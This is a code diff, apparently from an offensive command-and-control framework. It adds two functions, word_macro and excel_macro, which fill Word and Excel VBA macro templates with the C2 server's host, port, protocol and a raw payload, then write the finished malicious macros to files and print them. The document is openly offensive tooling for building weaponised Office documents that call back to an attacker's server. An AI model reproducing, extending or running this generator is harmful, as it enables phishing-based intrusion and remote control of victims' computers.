@@ -197,3 +197,33 @@ def donut_shellcode():
     out.close()
     print("---+  Donut Shellcode ---+ !\n")
     print('donut shellcode written to payloads/donut_shellcode.b64 \n' )
+
+
+def word_macro():
+    f=open("agents/word_macro.ninja","r")
+    payload=f.read()
+    if SSL==True:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}","https")
+    else:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}","http")
+
+
+    out=open("payloads/Word_macro.vba","w")
+    out.write(payload)
+    out.close()
+    print("Word Macro Payload written to payloads/Word_macro.vba : \n================Word Macro===========\n"+payload)
+    print("=====================================")
+
+def excel_macro():
+    f=open("agents/Excel_macro.ninja","r")
+    payload=f.read()
+    if SSL==True:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}","https")
+    else:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}","http")
+
+    out=open("payloads/Excel_macro.vba","w")
+    out.write(payload)
+    out.close()
+    print("Excel Macro Payload written to payloads/Excel_macro.vba : \n================Excel Macro===========\n"+payload)
+    print("=====================================")
